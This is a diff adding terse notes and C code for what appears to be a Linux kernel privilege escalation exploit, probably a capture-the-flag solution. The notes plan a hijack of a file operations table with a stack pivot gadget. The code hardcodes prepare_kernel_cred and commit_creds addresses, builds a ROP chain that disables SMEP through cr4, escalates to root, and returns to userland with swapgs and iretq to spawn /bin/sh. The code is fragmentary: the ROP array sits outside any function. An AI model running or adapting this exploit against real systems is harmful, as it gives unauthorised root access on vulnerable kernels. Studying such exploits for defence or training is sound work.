@@ -1,0 +1,71 @@
+=> rax
+
+mov    rax,QWORD PTR [r12+0x18]
+
+rax = operations
+
+mov rax,QWORD PTR [rax+0x38]
+
+rax = operations->write() 
+
+
+=> operations[0]
+operations[0] = 0xffffffff817a1f3b 
+
+0xffffffff817a1f3b : pop rax ; pop rbp ; ret
+
+
+=> operations[7]
+0xffffffff8106506f push r8 ; ret
+
+rip : operations
+
+operations[7] => rax
+operations[0] => r8
+
+write(fd, xxx, 0x10) => r13
+
+call rax => push rip + jmp rax
+
+
+
+
+#define prepare_kernel_cred_addr 0xffffffff810bd944
+#define commit_creds_addr 0xffffffff810bd56a
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    __asm__("mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+            );
+    puts("[*]status has been saved.");
+}
+
+void get_shell()
+{
+    system("/bin/sh");
+}
+
+void get_root()
+{
+    char* (*pkc)(int) = prepare_kernel_cred_addr;
+    void (*cc)(char*) = commit_creds_addr;
+    (*cc)((*pkc)(0));
+}
+
+    size_t rop[32] = {0};
+    rop[i++] = 0xffffffff81521a97;      // pop rdi; ret;
+    rop[i++] = 0x6f0;
+    rop[i++] = 0xffffffff8101fb0d;      // mov cr4, rdi; ret;
+    rop[i++] = (size_t)get_root;
+    rop[i++] = 0xffffffff8106c717;      // swapgs; ret;
+    rop[i++] = 0xffffffff81035a2b;      // iretq; ret
+    rop[i++] = (size_t)get_shell;
+    rop[i++] = user_cs;                /* saved CS */
+    rop[i++] = user_rflags;            /* saved EFLAGS */
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
